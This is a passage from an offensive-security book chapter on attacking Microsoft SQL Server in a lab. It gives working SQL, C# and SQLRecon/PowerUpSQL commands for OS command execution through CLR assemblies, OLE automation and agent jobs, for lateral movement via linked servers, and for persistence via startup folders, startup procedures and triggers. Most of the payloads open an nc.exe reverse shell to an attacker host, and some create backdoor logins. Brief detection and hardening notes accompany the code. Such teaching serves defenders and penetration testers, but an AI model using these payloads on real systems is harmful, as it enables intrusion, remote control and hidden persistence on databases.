<p>The successful loaded DLL generates event ID <strong class="source-inline">33090</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer270">
<img alt="Figure 9.15 – DLL was successfully loaded into memory" height="292" src="image/B18964_09_15.jpg" width="741"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.15 – DLL was successfully loaded into memory</p>
<p>The failed<a id="_idIndexMarker909"/> attempt will generate an<a id="_idIndexMarker910"/> error with ID <strong class="source-inline">17750</strong>. By correlating both events, it is possible to build detection around DLL names if there is a pre-defined list in <span class="No-Break">an environment.</span></p>
<h2 id="_idParaDest-192"><a id="_idTextAnchor209"/>Custom CLR assemblies</h2>
<p><strong class="bold">Common Language Runtime</strong> (<strong class="bold">CLR</strong>) assembly<a id="_idIndexMarker911"/> is a .NET DLL <a id="_idIndexMarker912"/>that can be imported into SQL Server. After it is imported, DLL methods can be linked to stored procedures. In this scenario, an attack consists of two steps – enabling CLR and the actual execution. A nice step-by-step blog post detailing this was created by <em class="italic">NetSPI</em>[20]. C# code is compiled in DLL and imported into SQL Server. The following queries allow you to execute the <span class="No-Break">OS command:</span></p>
<pre class="console">
use msdb
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'clr enabled',1
RECONFIGURE
CREATE ASSEMBLY my_evil FROM 'C:\Users\Public\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_evil].[StoredProcedures].[cmd_exec];</pre> <p>Another advantage of this method is that it is possible to use a hex representation of the DLL purely in memory, without touching <span class="No-Break">the disk.</span></p>
<p>There are two more considerations to keep in mind. This technique requires the <strong class="source-inline">TRUSTWORTHY</strong> property to be set, which is why we use the <strong class="source-inline">msdb</strong> database that has this property by default. Also, the <strong class="source-inline">clr strict security</strong> option was introduced by Microsoft[21]. By default, the <strong class="source-inline">permission_set</strong> option in <strong class="source-inline">alter/create</strong> assembly statements will be ignored. To switch it off, reconfiguration of CLR strict security is required <span class="No-Break">through </span><span class="No-Break"><strong class="source-inline">sp_configure</strong></span><span class="No-Break">.</span></p>
<p>For demonstration purposes, we will combine the use of SQLRecon and the <strong class="source-inline">Create-SQLFileCLRDll</strong> function from PowerUpSQL to obtain an interactive reverse shell. The very first step is to enable<a id="_idIndexMarker913"/> CLR with the <span class="No-Break">following command:</span></p>
<pre class="console">
SQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:"sa_P@ssw0rd!Ess0s" /module:EnableClr</pre> <p>Then, we use<a id="_idIndexMarker914"/> the <strong class="source-inline">Create-SQLFileCLRDll</strong> function to generate code for a <span class="No-Break">custom assembly:</span></p>
<pre class="console">
Create-SQLFileCLRDll -OutFile runcmd -OutDir . -AssemblyName "runcmd" -AssemblyClassName "StoredProcedures" -AssemblyMethodName "cmd_exec"</pre> <p>Let us change the generated <strong class="source-inline">.csc</strong> file. The following code <span class="No-Break">works perfectly:</span></p>
<pre class="console">
            using System;
            using System.Data;
            using System.Data.SqlClient;
            using System.Data.SqlTypes;
            using Microsoft.SqlServer.Server;
            using System.Diagnostics;
            public partial class StoredProcedures
            {
            [Microsoft.SqlServer.Server.SqlProcedure]
            public static void cmd_exec ()
            {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
               proc.StartInfo.Arguments = string.Format(@" /C C:\Users\Public\nc.exe -e cmd 192.168.56.100 443");
            proc.Start();
            proc.WaitForExit();
            proc.Close();
            }
            };</pre> <p>The following<a id="_idIndexMarker915"/> two commands will compile the code from <a id="_idIndexMarker916"/>above in DLL, and SQLRecon will automate the rest of <span class="No-Break">the process:</span></p>
<pre class="console">
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:\Users\Public\runcmd.csc
SQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:"sa_P@ssw0rd!Ess0s" /module:Clr /dll:runcmd.dll /function:cmd_exec</pre> <p>Note that SQLRecon bypasses the <strong class="source-inline">clr strict security</strong> option by adding assembly to <span class="No-Break">trusted list:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer271">
<img alt="Figure 9.16 – Custom CLR successfully executed a reverse shell" height="492" src="image/B18964_09_16.jpg" width="1582"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.16 – Custom CLR successfully executed a reverse shell</p>
<p>As a result, we have an interactive shell on <span class="No-Break">the target:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer272">
<img alt="Figure 9.17 – An interactive reverse shell on the database server" height="368" src="image/B18964_09_17.jpg" width="782"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.17 – An interactive reverse shell on the database server</p>
<p>This functionality is<a id="_idIndexMarker917"/> also implemented in a <a id="_idIndexMarker918"/>Metasploit module called <strong class="source-inline">exploit/windows/mssql/mssql_clr_payload</strong> and in another PowerShell tool <span class="No-Break">called </span><span class="No-Break"><strong class="bold">SeeCLRly</strong></span><span class="No-Break">[22].</span></p>
<p>In order to list and export existing<a id="_idIndexMarker919"/> CLR assemblies, the <strong class="source-inline">Get-SQLStoredProcedureCLR</strong> function was implemented in PowerUpSQL. We can then modify the exported CLR DLL by using the <strong class="source-inline">dnSpy</strong> decompiler and re-upload it, overwriting the existing one to achieve <span class="No-Break">stealthy persistence.</span></p>
<p>Attack detection is possible via event ID <strong class="source-inline">15457</strong>, as an adversary must use <strong class="source-inline">sp_configure</strong>. Assembly creation will generate event ID <strong class="source-inline">6299</strong>, unloading the assembly will generate event ID <strong class="source-inline">10310</strong>, and the unload confirmation generate event ID <strong class="source-inline">6290</strong>. Correlating and chaining together these four events can help in the reliable detection of <span class="No-Break">malicious activity.</span></p>
<h2 id="_idParaDest-193"><a id="_idTextAnchor210"/>OLE automation procedures</h2>
<p><strong class="bold">Object Linking and Embedding</strong> (<strong class="bold">OLE</strong>) technology <a id="_idIndexMarker920"/>allows you to link objects <a id="_idIndexMarker921"/>from one application to another. OLE automation procedures help SQL Server to use to interact with COM objects. The <strong class="bold">Component Object Model</strong> (<strong class="bold">COM</strong>) allows interaction between binary software components. OLE automation procedures<a id="_idIndexMarker922"/> use <strong class="source-inline">odsole70.dll</strong> to interact with the COM[23]. The following is a list of procedures that can be used for <span class="No-Break">command execution:</span></p>
<ul>
<li><strong class="source-inline">sp_OACreate</strong> – creates an OLE <span class="No-Break">object instance</span></li>
<li><strong class="source-inline">sp_OAMethod</strong> – calls an OLE <span class="No-Break">object method</span></li>
<li><strong class="source-inline">sp_OADestroy</strong> – destroys a created <span class="No-Break">OLE object</span></li>
<li><strong class="source-inline">sp_OASetProperty</strong> – sets an OLE <span class="No-Break">object property</span></li>
</ul>
<p>Some practical OLE usage examples include creating a web shell on a web server, downloading malware, moving files around a filesystem, and executing commands. The <strong class="source-inline">Invoke-SQLOSCmdCLR</strong> function in PowerUpSQL will enable OLE automation, execute a command, read the command’s output from the temporary file, and then delete it. The Metasploit <strong class="source-inline">admin/mssql/mssql_exec</strong> module can be switched to use the <strong class="source-inline">sp_OACreate</strong> procedure as well. However, it will be up to an attacker on the method to retrieve results – for example, with the <strong class="source-inline">OPENROWSET()</strong> function. The following are commands to obtain an interactive reverse shell with the help of SQLRecon <span class="No-Break">and </span><span class="No-Break"><strong class="source-inline">nc.exe</strong></span><span class="No-Break">:</span></p>
<pre class="console">
SQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:"sa_P@ssw0rd!Ess0s" /module:enableole
SQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:"sa_P@ssw0rd!Ess0s" /module:olecmd /command:"C:\Users\Public\nc.exe -e cmd 192.168.56.100 443"</pre> <p>The result of the successful execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer273">
<img alt="Figure 9.18 – OS command execution through the OLE automation procedures" height="348" src="image/B18964_09_18.jpg" width="1198"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.18 – OS command execution through the OLE automation procedures</p>
<p>The <a id="_idIndexMarker923"/>code to obtain a reverse shell<a id="_idIndexMarker924"/> manually is <span class="No-Break">shown here:</span></p>
<pre class="console">
DECLARE @output INT
DECLARE @ProgramToRun VARCHAR(255)
SET @ProgramToRun = 'Run("cmd.exe /c C:\Users\Public\nc.exe -e cmd 192.168.56.100 443")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output</pre> <p>As with CLR execution, it is not possible to completely prevent this attack. It is recommended to keep OLE automation disabled and remove execution permissions on procedures stored by users. Detection is possible via <strong class="source-inline">sp_configure</strong> event monitoring on all the aforementioned execution methods. Additionally, event ID <strong class="source-inline">33090</strong> will be generated when <strong class="source-inline">odsole70.dll</strong> is loaded into memory, and event ID <strong class="source-inline">8128</strong> will be generated when <strong class="source-inline">sp_OACreate</strong> <span class="No-Break">is executed.</span></p>
<h2 id="_idParaDest-194"><a id="_idTextAnchor211"/>Agent jobs</h2>
<p>SQL Server Agent<a id="_idIndexMarker925"/> is a <a id="_idIndexMarker926"/>Windows service that executes automated tasks. The<a id="_idIndexMarker927"/> agent job will run under the SQL Server Agent service, or it can utilize agent proxy capabilities, meaning that jobs will be run in different user contexts. The job can be manually started by the <strong class="source-inline">sp_start_job</strong> stored procedure, scheduled, or executed when a specific condition is met. To create a job, either a <strong class="source-inline">sysadmin</strong> role or <strong class="source-inline">SQLAgentUserRole</strong>, <strong class="source-inline">SQLAgentReaderRole</strong>, and <strong class="source-inline">SQLAgentOperatorRole</strong> fixed database roles in the <strong class="source-inline">msdb</strong> database are required. There are promising job types, such as CmdExec, PowerShell, ActiveX Script, and SQL Server Integrated Services, that allow command execution. The following steps are required to utilize a <span class="No-Break">job functionality:</span></p>
<ul>
<li><strong class="source-inline">sp_add_job</strong> – create <span class="No-Break">a job</span></li>
<li><strong class="source-inline">sp_add_jobstep</strong> – add a <span class="No-Break">job step</span></li>
<li><strong class="source-inline">sp_start_job</strong> – run <span class="No-Break">a job</span></li>
<li><strong class="source-inline">sp_delete_job</strong> – delete <span class="No-Break">a job</span></li>
</ul>
<p>A great<a id="_idIndexMarker928"/> demonstration of the step-by-step job creation for PowerShell was shown in an Optiv blog post[24]. Let us create a job for CmdExec to obtain a <span class="No-Break">reverse shell:</span></p>
<pre class="console">
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC SP_CONFIGURE 'Agent XPs', 1
RECONFIGURE
USE msdb
EXEC dbo.sp_add_job @job_name = N'rev_shell'
EXEC sp_add_jobstep @job_name = N'rev_shell', @step_name = N'run_nc',
@subsystem = N'cmdexec', @command = N'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443', @retry_attempts = 1, @retry_interval = 5
EXEC dbo.sp_add_jobserver @job_name = N'rev_shell'
EXEC dbo.sp_start_job N'rev_shell'
EXEC dbo.sp_delete_job @job_name = N'rev_shell'</pre> <p>Unfortunately, this code will not run in our lab because SQL Server Agent service cannot be started. The reason for this is that Agent jobs are supported only in paid MS SQL Server versions, not in Express. However, it is good to show such attack vector as well. As usual, there is a function in PowerUpSQL (<strong class="source-inline">Invoke-SQLOSCmdAgentJob)</strong> and two modules in SQLRecon (<strong class="source-inline">AgentStatus</strong> and <strong class="source-inline">AgentCmd</strong>) to automate the task. Instead of creating a new job, the attacker can add a step to an existing one. To list all jobs, there is <a id="_idIndexMarker929"/>the <strong class="source-inline">Get-SQLAgentJob</strong> function in PowerUpSQL or the <span class="No-Break">following query:</span></p>
<pre class="console">
SELECT
job.job_id, notify_level_email, name, enabled,
description, step_name, command, server, database_name
FROM
msdb.dbo.sysjobs job
INNER JOIN
msdb.dbo.sysjobsteps steps
ON
job.job_id = steps.job_id</pre> <p>Prevention recommendations including disabling the SQL Server Agent service if it is not used and limiting users with <strong class="source-inline">SQLAgentUserRole</strong>, <strong class="source-inline">SQLAgentReaderRole</strong>, and <strong class="source-inline">SQLAgentOperatorRole</strong> fixed <span class="No-Break">database roles.</span></p>
<h2 id="_idParaDest-195"><a id="_idTextAnchor212"/>External scripts</h2>
<p>There is <a id="_idIndexMarker930"/>another way to run commands with the help of the Machine Learning Services feature. It gives you the ability to run R and Python scripts. Installation of this feature requires a paid version of the SQL Server. In our case, we will use the free Express version and just briefly go through available ways to run commands. First of all, to enable external scripts, <strong class="source-inline">sysadmin</strong> privileges are required, together with server-level changes (<strong class="source-inline">sp_configure 'external scripts enabled'</strong>). Both languages have a wide variety of ways to run arbitrary code, ranging from UNC path injection to full interactive shell. Some interesting examples can be found in[25] and in[26]. The <strong class="source-inline">Invoke-SQLOSCmdR</strong> and <strong class="source-inline">Invoke-SQLOSCmdPython</strong> functions from PowerUpSQL can also automate the <span class="No-Break">exploitation process.</span></p>
<p>In the following section, we will examine ways in which an attacker can move laterally on the domain and database levels in the <span class="No-Break">target environment.</span></p>
<h1 id="_idParaDest-196"><a id="_idTextAnchor213"/>Lateral movement</h1>
<p>As we saw in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a>, it is crucial to understand<a id="_idIndexMarker931"/> how an adversary can abuse legitimate applications and protocols to expand inside the target environment. SQL Server also broadens lateral movement scenarios via two techniques. One is common and called shared service accounts. The other one is specific only to SQL Server – abusing database links. We will quickly explore the first one and focus on the second. We will examine how to do enumeration on linked servers, execute code, and extract clear-text <span class="No-Break">hardcoded credentials.</span></p>
<h2 id="_idParaDest-197"><a id="_idTextAnchor214"/>Shared service accounts</h2>
<p>Using <a id="_idIndexMarker932"/>shared service accounts across an environment may lead to disastrous consequences. If a service account is compromised via Kerberoasting, UNC path injection, or any other way, it means that all instances using this account are compromised. Moreover, the service account by default has <strong class="source-inline">sysadmin</strong> privileges on the database and SQL Server levels, but it also may have extensive privileges on the underlying OS. To prevent such a powerful lateral move, all service accounts should be unique across the environment, with gMSA <span class="No-Break">in use.</span></p>
<h2 id="_idParaDest-198"><a id="_idTextAnchor215"/>Database links</h2>
<p>What are database links? In <a id="_idIndexMarker933"/>simple terms, they <a id="_idIndexMarker934"/>are a persistent connection between two or more servers. They allow you to access external data sources and, if the source is a SQL Server, also execute stored procedures. Links work even across forest trusts and can sometimes be the only way to get a foothold in another domain or forest. There are two ways links can be configured – with a current logged-in user context or hardcoded credentials. Queries on the linked server are executed as a user whose credentials were used to configure the link. Effectively, it is impersonation. Links can be crawled, meaning that an adversary can jump consequently from one SQL Server to another. We need to understand who we are, perform enumeration, and look for privilege escalation or lateral <span class="No-Break">movement options.</span></p>
<p>An ideal attacking scenario is to identify linked servers, check user account privileges on them, verify the <strong class="source-inline">RPC Out</strong> value, and enable <strong class="source-inline">xp_cmdshell</strong> to obtain command execution. <strong class="source-inline">RPC Out</strong> allows you to run stored procedures on the specified linked server and can only be enabled with <strong class="source-inline">sysadmin</strong> privileges, using the <strong class="source-inline">sp_serveroption</strong> procedure. If <strong class="source-inline">RPC Out</strong> is disabled, it will be impossible to enable <strong class="source-inline">xp_cmdshell</strong> on the linked server, even with <strong class="source-inline">sysadmin</strong> privileges. The reason for this is that queries running via <strong class="source-inline">openquery()</strong> do not require <strong class="source-inline">RECONFIGURE</strong> to <span class="No-Break">be run.</span></p>
<p>PowerUpSQL has two functions (<strong class="source-inline">Get-SQLServerLink</strong> and <strong class="source-inline">Get-SQLServerLinkCrawl</strong>) that help to identify links. Metasploit has its own module called <strong class="source-inline">exploit/windows/mssql/mssql_linkcrawler</strong> that can deploy payloads in a fully automated way. The attack steps are as follows: find the linked server, enumerate it, understand the login context, and then escalate privileges and/or move <span class="No-Break">them laterally.</span></p>
<p>We will use SQLRecon for <a id="_idIndexMarker935"/>the rest of this section. I logged in as <strong class="source-inline">jon.snow</strong> to perform all the aforementioned actions with the <span class="No-Break">following commands:</span></p>
<pre class="console">
SQLRecon.exe /a:WinToken /h:castelblack /m:whoami
SQLRecon.exe /a:WinToken /h:castelblack /m:links
SQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lwhoami
SQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lcheckrpc
SQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lenablexp
SQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lxpcmd /c:"C:\Users\Public\nc.exe -e cmd 192.168.56.100 443"</pre> <p>The following is the output of the commands executed on the <span class="No-Break">linked server:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer274">
<img alt="Figure 9.19 – Linked server enumeration" height="1110" src="image/B18964_09_19.jpg" width="881"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.19 – Linked server enumeration</p>
<p>The successful command execution gave us an interactive shell on <span class="No-Break">the target:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer275">
<img alt="Figure 9.20 – An interactive reverse shell on the linked server" height="375" src="image/B18964_09_20.jpg" width="781"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.20 – An interactive reverse shell on the linked server</p>
<p>At the beginning of <a id="_idIndexMarker936"/>this section, we mentioned hardcoded credentials. If SQL Server credentials are used to create links, they are stored in an encrypted format and, therefore, can be pulled in clear text[27]. Successful extraction requires <strong class="source-inline">sysadmin</strong> privileges for all <a id="_idIndexMarker937"/>database instances on a <strong class="bold">Dedicated Administrative Connection</strong> (<strong class="bold">DAC</strong>) and local administrative privileges on the server itself to get access to entropy bytes in the registry. These bytes are used to strengthen encryption and are stored in the registry. The script pulls data from a few tables as well. If everything works as expected, you will extract <span class="No-Break">clear-text passwords.</span></p>
<p>One more interesting use of linked servers is LDAP enumeration via OpenQuery[28]. We will need a set of valid domain credentials before we start. They can be obtained by cracking the NTLMv2 challenge after a UNC path injection attack or by simply utilizing the domain account of the SQL service. The idea is to establish an <strong class="bold">Active Directory Service Interface</strong> (<strong class="bold">ADSI</strong>) linked server <a id="_idIndexMarker938"/>and run LDAP queries <span class="No-Break">via OpenQuery:</span></p>
<pre class="console">
EXEC master.dbo.sp_addlinkedserver @server = N'ENUM',
@srvproduct=N'Active Directory Service Interfaces',
@provider=N'ADSDSOObject', @datasrc=N'adsdatasource';
EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname = N'ENUM',
@locallogin = NULL , @useself = N'True';
(SELECT * FROM OPENQUERY(DEMO, 'SELECT sAMAccountName,
userAccountControl FROM ''LDAP://north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local''
WHERE objectCategory = ''Person'' AND objectClass = ''user'''))</pre> <p>The result is <a id="_idIndexMarker939"/>shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer276">
<img alt="Figure 9.21 – Domain user enumeration via OpenQuery" height="447" src="image/B18964_09_21.jpg" width="705"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.21 – Domain user enumeration via OpenQuery</p>
<p>To prevent link abuse, remove unused links and check chained links as well. Ensure that links are not configured with <strong class="source-inline">sysadmin</strong> or overly permissive privileges. Consider disabling <strong class="source-inline">RPC Out</strong> <span class="No-Break">as well.</span></p>
<p>The following section will show how persistence can be achieved at the SQL Server and OS levels by using legitimate functionality from <span class="No-Break">SQL Server.</span></p>
<h1 id="_idParaDest-199"><a id="_idTextAnchor216"/>Persistence</h1>
<p>Now that we know about <a id="_idIndexMarker940"/>persistence on domain and domain controller levels, why bother with SQL Server? Most detective controls are implemented at the OS level. Database audits are not so common and thorough. A SQL Server service account may have extensive permissions on the OS, giving an attacker an excellent hideout, as all questionable actions will be logged as they were performed by the service account. Lastly, even if auditing and monitoring are enabled on busy databases, it is difficult to differentiate legitimate activities from malicious ones. We will start with the most noisy and unsafe way to achieve persistence at the OS level via autoruns, moving toward the SQL<a id="_idIndexMarker941"/> Server level, with startup procedures <span class="No-Break">and triggers.</span></p>
<h2 id="_idParaDest-200"><a id="_idTextAnchor217"/>File and registry autoruns</h2>
<p>These two<a id="_idIndexMarker942"/> methods are very OpSec-unsafe, as the <strong class="source-inline">Startup</strong> folder and registry keys are often monitored by security solutions, such as Sysmon and EDR. There is a slight chance that writing a file in such locations using a SQL Server service account will be treated as legitimate behavior. Again, it is highly <span class="No-Break">not recommended.</span></p>
<p>We will start by writing a file to the <strong class="source-inline">Startup</strong> folder. If the SQL Server service account is configured with extensive permissions on the host, it is possible to put the file in a folder of a high-privileged user, or even for all users. The OLE automation procedure must be enabled beforehand. The following code creates a batch file in the <strong class="source-inline">sql_svc</strong> <strong class="source-inline">Startup</strong> folder that will make a connection back to <span class="No-Break">our machine:</span></p>
<pre class="console">
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev.bat', 2, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, 'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE</pre> <p>On the next login of <strong class="source-inline">sql_svc</strong>, we receive the connection back, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer277">
<img alt="Figure 9.22 – The reverse shell from the file in the Startup folder" height="361" src="image/B18964_09_22.jpg" width="774"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.22 – The reverse shell from the file in the Startup folder</p>
<p>SQL Server also<a id="_idIndexMarker943"/> allows you to interact with the registry using stored procedures – <strong class="source-inline">xp_regwrite</strong>, <strong class="source-inline">xp_regread</strong>, and <strong class="source-inline">xp_regdeletekey</strong>. Executing these procedures requires <strong class="source-inline">sysadmin</strong> privileges. However, at the OS level, this is not enough – for example, writing to <strong class="source-inline">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run hive</strong> requires local administrative privileges. PowerUpSQL has three functions that use the registry <span class="No-Break">for persistence:</span></p>
<ul>
<li><strong class="source-inline">Get-SQLPersistRegDebugger</strong> – setting a custom debugger for <span class="No-Break">accessibility options</span></li>
<li><strong class="source-inline">Get-SQLPersistRegRun</strong> – writing a payload in the <span class="No-Break">autorun key</span></li>
<li><strong class="source-inline">Get-SQLRecoverPwAutoLogon</strong> – reading <span class="No-Break">autologin passwords</span></li>
</ul>
<p>Now, let us examine some more OpSec safe options for persistence at the <span class="No-Break">database level.</span></p>
<h2 id="_idParaDest-201"><a id="_idTextAnchor218"/>Startup stored procedures</h2>
<p>As you can<a id="_idIndexMarker944"/> guess from the name of this type of procedure, it runs when SQL Server starts or restarts. All such procedures run under the <strong class="source-inline">sa</strong> login, must be owned by <strong class="source-inline">sa</strong>, and must be in the master database. To mark a procedure for automated execution, <strong class="source-inline">sysadmin</strong> privileges are required, but not necessary <strong class="source-inline">sa</strong>. Procedures cannot accept any input/output parameters. The following code creates our malicious procedure (<strong class="source-inline">sp_rev_shell</strong>), marks it for automated execution, and lists automatically executed <span class="No-Break">stored procedures:</span></p>
<pre class="console">
USE master
CREATE PROCEDURE sp_rev_shell
AS
EXEC master..xp_cmdshell 'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'
EXEC sp_procoption @ProcName = 'sp_rev_shell', @OptionName = 'startup', @OptionValue = 'on';
SELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;</pre> <p>After the SQL Server <a id="_idIndexMarker945"/>service restart, the reverse shell <span class="No-Break">was executed:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer278">
<img alt="Figure 9.23 – Persistence via a startup stored procedure" height="361" src="image/B18964_09_23.jpg" width="774"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.23 – Persistence via a startup stored procedure</p>
<p>There is also a PowerShell script that automates these actions[30]. It incorporates three persistence scenarios – creating a new SQL Server <strong class="source-inline">sysadmin</strong> login, creating a Windows local administrator account, and running a <span class="No-Break">PowerShell command:</span></p>
<pre class="console">
Invoke-SqlServer-Persist-StartupSp -SqlServerInstance BRAAVOS\SQLEXPRESS -NewSqlUser evil -NewSqlPass evil123! -Verbose</pre> <p>The result of the script execution is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer279">
<img alt="Figure 9.24 – Fully automated sysadmin user creation" height="340" src="image/B18964_09_24.jpg" width="1208"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.24 – Fully automated sysadmin user creation</p>
<p>The main <a id="_idIndexMarker946"/>disadvantage of this method is that we must wait for the maintenance of the SQL Server. NetSPI’s blog post[29] shows how to enable server- and database-level audit features. They detect the use of the <strong class="source-inline">sp_procoption</strong> procedure (event ID <strong class="source-inline">33205</strong>), the launch of a malicious startup procedure (event ID <strong class="source-inline">17135</strong>), and a new SQL Server login with <strong class="source-inline">sysadmin</strong> privileges (event ID <strong class="source-inline">33205</strong>). Lastly, if an adversary decides to change or delete audit settings, event ID <strong class="source-inline">33205</strong> will <span class="No-Break">be generated.</span></p>
<h2 id="_idParaDest-202"><a id="_idTextAnchor219"/>Malicious triggers</h2>
<p>What is <a id="_idIndexMarker947"/>a trigger? According to Microsoft, “<em class="italic">a trigger is a special type of stored procedure that automatically runs when an event occurs in the database server</em>”[31]. There<a id="_idIndexMarker948"/> are three types of triggers, which<a id="_idIndexMarker949"/> differ<a id="_idIndexMarker950"/> based on the <span class="No-Break">execution condition:</span></p>
<ul>
<li><strong class="bold">Data Definition Language</strong> (<strong class="bold">DDL</strong>) – <strong class="source-inline">CREATE</strong>, <strong class="source-inline">ALTER</strong>, and <span class="No-Break"><strong class="source-inline">DROP</strong></span><span class="No-Break"> statements</span></li>
<li><strong class="bold">Data Manipulation Language</strong> (<strong class="bold">DML</strong>) – <strong class="source-inline">INSERT</strong>, <strong class="source-inline">UPDATE</strong>, and <span class="No-Break"><strong class="source-inline">DELETE</strong></span><span class="No-Break"> statements</span></li>
<li><strong class="bold">Logon triggers</strong> – an <span class="No-Break">on-logon </span><span class="No-Break"><a id="_idIndexMarker951"/></span><span class="No-Break">event</span></li>
</ul>
<p>A DDL trigger<a id="_idIndexMarker952"/> applies <a id="_idIndexMarker953"/>at the server and database levels. There are tons of DDL events and event groups[32] that can be used to create a trigger. Some of them can happen every few minutes in busy environments, so choose wisely. Trigger creation is as simple as the <span class="No-Break">following code:</span></p>
<pre class="console">
CREATE TRIGGER [ddl_persist]
ON DATABASE
FOR DROP_TABLE
AS
EXEC master..xp_cmdshell 'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'</pre> <p>DML triggers <a id="_idIndexMarker954"/>work only at the database level. We will choose a<a id="_idIndexMarker955"/> statement and table. The important caveat is that users working with the target table may not have enough permissions for actions such as running <strong class="source-inline">xp_cmdshell</strong>. NetSPI in their blog[33] advises to either grant an <strong class="source-inline">sa</strong> impersonation permission for all users or use a proxy account for <strong class="source-inline">xp_cmdshell</strong> execution. The following <a id="_idIndexMarker956"/>code will create a <span class="No-Break">DML trigger:</span></p>
<pre class="console">
CREATE TRIGGER [dml_persist]
ON new.dbo.player
FOR INSERT, UPDATE, DELETE
AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'</pre> <p>Logon triggers <a id="_idIndexMarker957"/>are used to prevent users from logging in depending on certain <a id="_idIndexMarker958"/>conditions. Instead of using a real user login, an attacker can create a low-privileged fake account and utilize it when persistence is required. The code for such a trigger <span class="No-Break">is self-explanatory:</span></p>
<pre class="console">
CREATE LOGIN [fake] WITH PASSWORD = 'fake123!'
CREATE TRIGGER [logon_persist]
ON ALL SERVER WITH EXECUTE AS 'sa'
FOR LOGON
AS
BEGIN
IF ORIGINAL_LOGIN() = 'fake'
    EXEC master..xp_cmdshell 'C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'
END</pre> <p>Trying to log in <a id="_idIndexMarker959"/>with a fake account will trigger the connection but also leave an error in the log, with the event ID <strong class="source-inline">17892</strong>. With enabled audit features, trigger creation code will be fully logged in the event <span class="No-Break">ID </span><span class="No-Break"><strong class="source-inline">33205</strong></span><span class="No-Break">.</span></p>
<h1 id="_idParaDest-203"><a id="_idTextAnchor220"/>Summary</h1>
<p>In conclusion, there are many reasons for an adversary to choose SQL Server as a valuable target. We saw in practice how to perform enumeration against a database server. We deep-dived into various privilege escalation techniques, not focusing only on the database level. By gradually migrating from a low-privileged public account to <strong class="source-inline">SYSTEM</strong>, we covered the attacker’s kill chain. Then, many techniques for OS command execution were demonstrated in order to help us understand how tightly applications can be integrated with a host OS. Furthermore, we saw how database links can be abused by an adversary for lateral movement if they are not configured correctly. Finally, persistence techniques were discussed at the OS and database levels. A deeper understanding of available database functionality can give one party an advantage over <span class="No-Break">the other.</span></p>
<h1 id="_idParaDest-204"><a id="_idTextAnchor221"/>Further reading</h1>
<p>These aids for further study will let you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ol>
<li>SQL Server network <span class="No-Break">ports: </span><a href="https://www.mssqltips.com/sqlservertip/7212/sql-server-port-explanation-usage/"><span class="No-Break">https://www.mssqltips.com/sqlservertip/7212/sql-server-port-explanation-usage/</span></a></li>
